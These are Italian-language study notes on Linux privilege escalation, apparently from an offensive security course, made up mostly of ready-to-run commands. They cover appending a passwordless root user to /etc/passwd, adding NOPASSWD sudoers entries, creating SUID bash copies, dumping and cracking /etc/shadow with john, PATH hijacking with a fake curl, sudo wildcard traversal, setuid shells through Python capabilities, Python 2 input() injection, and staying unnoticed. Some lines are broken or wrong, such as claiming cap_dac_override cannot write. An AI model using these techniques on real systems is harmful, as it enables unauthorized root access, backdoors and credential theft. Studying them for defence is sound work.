* `passwd -m des 1234`
* `echo 'eve:AMm6cyJmasCPA:0:0:root:/root:/bin/bash' >> /etc/passwd` crea un utente `eve` che agisce come `root`
	* `0:0` sono `UID` e `GID`
	* `root:/root:/bin/bash` ossia nome descrittivo `root`, cartella home in `/root`  ed ha come shell `/bin/bash.`
* `/etc/shadow`: **contiene le password per gli utenti in `passwd`. questo file e' leggibile solo da `root`**
* `echo "eve ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`
	* `ALL=(ALL)` tutti possono fare sudo e tutti possono eseguire il comando specificato
	* `NOPASSWD:ALL`: non chiedere la password, per tutti i comandi
* `/bin/bash -p`: se uno script esegue con effective user id pari a 0, se questo chiama `/bin/bash -p` può eseguire la bash con `uid=0`. senza `-p`, `/bin/bash` per sicurezza non esegue con `uid=0` ma quello reale.

**creare bash con SUID**:
* `cp /bin/bash ~/myBash`
* `chmod 4777 ~/myBash
* `chmod +s ~/myBash`
* `~/myBash -p`: **non resettare l'UID se differisce da quello reale**. Ossia se posso

**esfiltrare le password**:
```bash
cat /etc/passwd
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed
john ... unshadowed
```

**path hijacking**:
* analizza gli script con privilegi elevati
* se uno di questi chiama un programma usando un **percorso relativo**
* allora posso iniettare un mio script con lo stesso nome

**come si fa path hijacking**? inserisci in `$PATH` una directory a cazzo di cane e metti la il programma malevolo. AGG
```bash
echo "<evil_script_here>" > /home/vickie/bin/curl; chmod +x /home/vickie/bin/curl
```

**exploit wildcard**:
* `sudo -l` 
* se leggo un percorso del tipo `/opt/scripts/*`
* **allora posso fare**: `/opt/scripts/../../etc/sudoers`
* **sfilza di** `..`: ne metto tanti, abbastanza da arrivare a `/`. Se sono troppi non fa niente, non ho nessun errore.

**7zip**: permette di comprimere i file, ma se eseguibile come root, allora  con `7za a backup.7z -t7z –snl` posso comprimere verso un file che chiunque puo leggere
* il file compresso appartiene tuttavia all'utente reale che ha eseguito il comando
* `-snl`: non segue i link simbolici, ma li tiene come link simbolico
* *si usa quando uno script con privilegi elevati fa il backup di una cartella dentro cui posso scrivere.

**import module**: posso sfruttare il modo in cui python importa i moduli. **cerca prima nella directory corrente**, **e poi i nei moduli built in**, e poi in `PYTHONPATH`

**cronjobs**: contesto, trovo uno script che viene eseguito periodicamente come root.
* **writable scripts**: posso modificarli per copiare chiavi ssh, o leggere altri file strani, o se sono root leggo `/etc/passwd`
* **non scrivibile**: posso tentare con path hijacking o wildcard injetcion
* **vulnerabilita**: se la versione di cron e' vecchia e posso accedere ad `/etc/crontab` allora posso aggiungere all'esecuzione script per ottenere pribilegi alti

**suid**:
* **trovare i file con suid**: `find -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` per cercare file con **suid** o **guid** di root
* `sudo -l`
* `getcap -r / 2> /dev/null`: cerca file con capabilities particolari

`cap_setuid`:
 * `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`
 * e simili per altri programmi... te li cerchi online sul momento stronzo.

`cap_dac_read_search`: `tar -czf /tmp/shadow.tar.gz /etc/shadow 2>/dev/null`
* **cosa fa**? posso leggere qualsiasi file sul sistema, e dunque leggere`/etc/shadow`, `/etc/passwd`, ecc...

`cap_dac_override`: `vim /etc/passwd` **e posso aggiungere il mio utente sburrevole**
* riespetto a `cap_dac_read_search` non posso scrivere.

---


**kernel exploits**: programmi che attaccano alcune versioni del kernel.

**dirty cow**: permette di sostituire l'utente root con un'altro a cui posso fare accesso.
* **instabile**: l'uso di questi exploit rende il sistema instabile.
* **crash**: potrebbe mandare in crash la macchina.
* **log**: posso essere sgamato.

**dirty cow non conviene**: i tool di difesa se ne accorgono subito che succede qualcosa di strano.

**cosa fare se ho abbastanza privilegi** (per qualsiasi strano motivo):
* **modificare** `/etc/passwd`: aggiungere un nuovo utente **senza password** con **user id root**

```bash
echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd
```
* **modificare** `/etc/sudoers`: in modo che posso fare sudo con l'utente corrente.
```bash
eve ALL=(ALL) NOPASSWD:ALL
```
* `ALL=(ALL)`: posso eseguire su tutti gli host per conto di tutti gli utenti.
* `NOPASSWD:ALL`: tag ed a seguire il comando `ALL`
* **effective user id**: sudo lo cambia momentaneamente a seconda delle regole in `/etc/sudoers`

* **creare fake bash**: 
	* `cp /bin/bash ~/myBash`
	* `chmod 4777 ~/myBash`: mi permette di eseguire `/bin/bash` come 
	* `~/myBash -p`: preserva `SUID`. anche se ho fatto `chmod 4777` devo dire a bash di preservare.
	* **all'esecuzione**: id e group id sono quelli dell'utente, mentre quello effective e' dell'utente proprietario di `/bin/bash`

* **password cracking su** `/etc/passwd` e `/etc/shadow`


## path hijacking
**script**: ho uno script con privilegi elevati che posso eseguire che invoca un comando come per esempio `curl`
**path**: metto un path custom con ranking elevato, per esempio `/home/vickie/bin`
**script custom**: metto in `/home/vickie/bin` un programma **evil** che si chiama `curl` che viene eseguito dallo script originale, che magari ha permessi elevati.

## wildcards
* `sudo -l`: lista dei comandi che un utente puo eseguire come sudo
* **regola con wildcard**: se `/etc/sudoers` contiene `ALL:ALL NOPASSWD: /usr/bin/cat /opt/scripts/*`
* **allora posso fare**: `/opt/scripts/../../etc/sudoers`
* **sfilza di** `..`: ne metto tanti, abbastanza da arrivare a `/`. Se sono troppi non fa niente, non ho nessun errore.




### python exploitation
* **python 2**, script che usano `input()`: in python 2 e' vulnerabile. Posso dare `__import__('os').system('/bin/bash')` ed eseguire cose con i privilegi del programma (magari a `SUID`).
* **python 3**: e' sicuro di default.
* **python module override**: quando python importa moduli legge in un'ordine specifico
	* 1.`current dir`
	* 2. built in
	* 3. `PYTHONPATH`
	* 4. std lib directories
	* 5. installati con pip
* **sudoers script replacement**: guardo in sudoers gli script che posso modificare.

### cronjob
* **scenario 1: posso modificare lo script** e fare lateral movement se non e' root, oppure copiare la shell e mettici SUID.
* **scenario 2**: **sola lettura**. allora devo fare path hijacking oppure sfrutto le wildcard.

## binari insicuri
* **find**: cerca binari con `suid`
* **getcap -r /**: cerca capabilities in `/`
* **nota**: gli editor di testo possono eseguire comandi e aprire shell.
* `cap_setuid` su python, gdb, ecc.... Posso creare script che fanno la chiamata a `setuid`
* `cap_dac_read_search`: posso legge quello che voglio
* `cap_dac_override`
* https://gtfobins.org


